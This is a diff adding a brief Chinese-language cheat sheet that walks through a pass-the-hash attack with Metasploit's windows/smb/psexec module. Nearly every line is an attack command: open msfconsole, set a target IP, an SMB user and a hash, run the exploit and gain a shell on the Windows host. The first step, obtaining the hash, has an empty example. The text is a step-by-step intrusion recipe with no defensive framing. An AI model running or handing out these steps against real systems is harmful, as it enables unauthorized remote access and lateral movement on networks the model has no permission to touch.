@@ -1,0 +1,19 @@
+1、获得对方主机的hash
+	ep：
+
+
+2、进入msf 	msfconsole
+
+3、使用指定explot	 use exploit/windows/smb/psexec 
+
+4、查看选项		show options
+
+5、设置目的Ip		set RHOST 192.168.0.254
+
+6、设置用户名		set SMBUser myh0st
+
+7、设置哈希值		 set SMBPass passwd
+
+8、开始攻击		exploit
+
+9、得到shell		systeminfo
